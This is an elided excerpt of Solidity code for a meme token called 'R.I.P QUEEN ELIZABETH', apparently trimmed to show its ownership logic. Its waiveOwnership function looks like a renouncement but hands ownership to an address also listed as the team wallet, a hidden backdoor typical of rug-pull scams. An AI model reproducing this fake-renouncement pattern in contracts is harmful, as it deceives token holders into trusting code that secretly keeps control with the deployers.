...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x7496884E5092d15FEaF478187A91492b7D99E0ab);
    }
...
contract RIPQUEENELIZABETH is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "R.I.P QUEEN ELIZABETH";
    string private _symbol = "KING CHARLES";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x23DFAD40d881A19bB013c0F8295E35632735a2A6);
    address payable private teamWalletAddress = payable(0x7496884E5092d15FEaF478187A91492b7D99E0ab);
